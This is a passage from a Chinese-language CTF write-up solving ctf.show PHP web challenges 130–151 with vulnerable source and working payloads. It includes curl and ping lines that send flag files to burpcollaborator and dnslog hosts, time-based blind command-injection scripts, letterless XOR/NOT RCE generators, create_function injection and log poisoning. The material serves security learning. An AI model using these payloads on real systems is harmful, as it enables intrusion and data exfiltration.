requestsurl=&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1# 非预期解f=ctfshowf[]=ctfshow 1.32 Web 131 — 正则最大回溯次数绕过1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = (String)$_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 1import requestsurl=&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1.33 Web 132 — false &amp;&amp; false || $username ===”admin”一个 Web 页面 扫描后台 1&lt;?php#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123; $username = (String)$_GET[&#x27;username&#x27;]; $password = (String)$_GET[&#x27;password&#x27;]; $code = (String)$_GET[&#x27;code&#x27;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123; if($code == &#x27;admin&#x27;)&#123; echo $flag; &#125; &#125;&#125; 1# payload?username=admin&amp;password=1&amp;code=admin 1.34 Web 133 — 无回显命令执行https://blog.csdn.net/qq_46091464/article/details/109095382 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6个字母都还不够呀?!&quot;); &#125;&#125; 分析 1如果传入 ?F=` $F`;sleep 5则 substr($F,0,6) 后得到 ` $F`;即执行 eval(` $F`;);也就是 eval(` ` $F`;sleep 5`;);而 `` 与 shell_exec() 一致则 eval(shell_exec(&quot; ` $F`;sleep 5&quot;));测试后 真的 执行了 sleep 5 题目转换成：无回显的命令执行 法一 1?F=`$F`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`$F`;+curl -X POST -d&quot;flag=`cat flag.php`&quot; ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net 1#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1 1.35 Web 134 — _POST 数组覆盖1&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123; die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123; die(file_get_contents(&#x27;flag.php&#x27;));&#125; 1# 测试&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# 传参 ?_POST[a]=123 1# payload?_POST[key1]=36d&amp;_POST[key2]=36d 1.36 Web 135 — 无回显命令执行 — 写文件 cp nl1web133plus 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); &#125;&#125; 1# payload?F=`$F`; cp flag.php 1.txt# 然后访问 1.txt 即可?F=`$F `;nl f*&gt;2.txt 1.37 Web 136 — 无回显命令执行 — ls|tee xxx1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1?c=ls|tee xxx 1# tee 命令 https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txt将正在执行命令的输出内容 写入 指定文件当中# 追加写入ping www.baidu.com | tee -a 1.txt# 写入多个文件当中ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee 2.txt 3.txt 4.txt # 让 tee 命令的输出内容直接作为另一个命令的输入内容 root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4 参考 https://linux.cn/article-9435-1.html 1?c=ls|tee xxx # 后访问 /xxx 将文件下载下来 得到当前目录之下 仅仅有 index.php 1?c=ls /|tee 111 1?c=cat /f149_15_h3r3|tee 222 1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1# payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag #不可行 php中 -&gt;与:: 调用类中的成员的区别-&gt; 用于动态语境处理某个类的某个实例:: 可以调用一个静态的、不依赖于其他初始化的类方法. 也就是说双冒号可以不用实例化类就可以直接调用类中的方法 1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag 1# 函数传参&lt;?phpfunction barber($type)&#123; echo &quot;You wanted a $type haircut, no problem\\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# 类传方法&lt;?phpclass myclass &#123; static function say_hello() &#123; echo &quot;Hello!\\n&quot;; &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; 1.40 Web 139 — 无回显命令注入 — awk、cut 盲注1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; awk cut 盲注 命令： 1root@kali:~/桌面/111# vi flag.phproot@kali:~/桌面/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk NR==1test1root@kali:~/桌面/111# cat flag.php | awk NR==2test2root@kali:~/桌面/111# cat flag.php | awk NR==3test3root@kali:~/桌面/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/桌面/111# cat flag.php | awk nr==4root@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/桌面/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi success root@kali:~/桌面/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi 脚本：查找根目录的内容 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; 脚本：查 flag 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; 1import requestscmd = &#x27;cat /f149_15_h3r3&#x27;result = &#x27;&#x27;for i in range(1, 10): for j in range(1, 50): print(&#x27;i=&#x27;, i, &#x27; j=&#x27;, j) for k in range(32, 128): k = chr(k) payload = f&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot; payload = &#x27;?c=&#x27; + payload url = &#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27; try: requests.get(url + payload, timeout=(2.5, 2.5)) except: result = result + k print(result) break result = result + &quot;\\n&quot; 1.41 Web 140 — intval($code) == ‘ctfshow’ — $code = eval(“return $f1($f2());”);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123; $f1 = (String)$_POST[&#x27;f1&#x27;]; $f2 = (String)$_POST[&#x27;f2&#x27;]; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123; $code = eval(&quot;return $f1($f2());&quot;); if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125;&#125; 我们的目的是 ，而且只能使用 字母和数字进行构造 1$code = eval(&quot;return $f1($f2());&quot;);if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;);&#125;# intval() == 弱类型比较，只要让 # $code 为 0 | False | NULL 即可 # 准确的来说，只要不是数字即可 1# payloadmd5(phpinfo()) #c4ca4238a0b923820dcc509a6f75849b #1md5(sleep()) #d41d8cd98f00b204e9800998ecf8427e #空密码md5(md5()) #d41d8cd98f00b204e9800998ecf8427e #空密码current(localeconv)sha1(getcwd())#md5(getcwd()) 不可行 #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval # 0f1=usleep&amp;f2=usleep 1.42 Web 141 — eval(“return $v1$v3$v2;”);1&lt;?php#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123; # v3 不能是 字母、数字、下划线 $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; \\w #匹配字母、数字、下划线。等价于 [A-Za-z0-9_] 测试： 1&lt;?phphighlight_file(__FILE__);# $code = eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;); #不可行// eval(&quot;return 0;phpinfo();&quot;); #不可行// eval(&quot;return 1-phpinfo();&quot;); #可行eval(&quot;return 1+phpinfo();&quot;); #可行eval(&quot;return 2+phpinfo();&quot;); #可行?&gt; # 也就是说，数字可以与命令进行运算 由于 v1 v2 也只能是 数字，那么我们可以构造 1+phpinfo()+1 等式子 v3 不能是 字母、数字、下划线，那么现在如何构造 v3? 无字母、数字 RCE 1root@kali:~/桌面/脚本# python re.py输出执行函数:&#x27;system&#x27;请输出函数参数:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;) 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# 尝试过后 不能直接用+ 要进行 URL 编码#+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截 也就是说，加减乘除，取反、异或，都可能 | 拼接 无字母数字脚本 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i | j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; if(is_numeric($v1))&#123; $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125;&#125; 1?v1=0 1.44 Web 143 — 141 plus1141的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了一些运算符 + - &amp; % / ~ $ _ . 过滤了 ; ，使用 ?&gt; 代替 仍旧有我们可以利用的 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截 ^异或拼接 无字母数字脚本 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/&#x27; # 题目过滤正则# 生成字典for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i ^ j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.45 Web 144 — 143 plus1143的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125;function check($str)&#123; return strlen($str)===1?true:false;&#125; 1#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^ 1.46 Web 145 — 144 plus1144的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了 ; ^ &lt; &quot; &gt; 和我们能用到的运算符 使用 | ? 绕过 ~ 脚本 1&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;; 三目运算符 1eval(&quot;return 1?phpinfo():1;&quot;); #可行 1#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1 1.47 Web 146 — 145 plus1145的plus版本 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; 过滤了 : 不能使用三目运算符了 测试 1&lt;?phphighlight_file(__FILE__);// eval(&quot;return 1==phpinfo()||1;&quot;); #可行// eval(&quot;return 1==phpinfo()|1;&quot;); #可行// eval(&quot;return 1===phpinfo()|1;&quot;); #可行// eval(&quot;return 1===phpinfo()||1;&quot;); #可行 eval(&quot;return 1=phpinfo()||1;&quot;); #不可行//eval(&quot;return 1=phpinfo()||1;&quot;); #不可行 1# payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1 1.48 Web 147 — create_function 命令注入1&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123; $ctfshow = $_POST[&#x27;ctf&#x27;]; if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123; $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]); &#125;&#125; create_function() 1create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123; echo $a.&quot;123&quot;;&#125; 那么如果我们第二个参数传入 echo 1;}phpinfo();//就等价于 1function f($a) &#123; echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令 1# payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\\create_function# \\ %5c 1.49 Web 148 — 中文变量1&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123; die(&quot;error&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123; echo file_get_contents(&quot;flag.php&quot;);&#125; 未过滤 ^ ; ，可直接异或构造 1# payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;); 利用中文变量 1?code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*其实也是利用异或构造&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET 1.50 Web 149 — 条件竞争 1&lt;?phperror_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125; 分析： 1# 在每次 写文件之前之后，都会删除 除了 index.php 之外的任何文件 解一：直接在 index.php 当中写入代码 1# 总是成功不了 解二：条件竞争 11. 写入 ?ctf=1.phpshow=&lt;?php system(&#x27;ls /&#x27;); ?&gt;2. 访问 /1.php3. 二者同时进行爆破 1.51 Web 150 —1对我们以前的内容进行了小结，我们文件上传系列再见！ 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; 分析： 1if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125;# 1.使 $isVIP = 1# 2.$ctf 中不能包含 : 写入日志 日志包含 1?isVIP=1ctf=/var/log/nginx/access.log&amp;a=system(&#x27;ls&#x27;); 1.52 Web 151 —1修复了非预期 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = 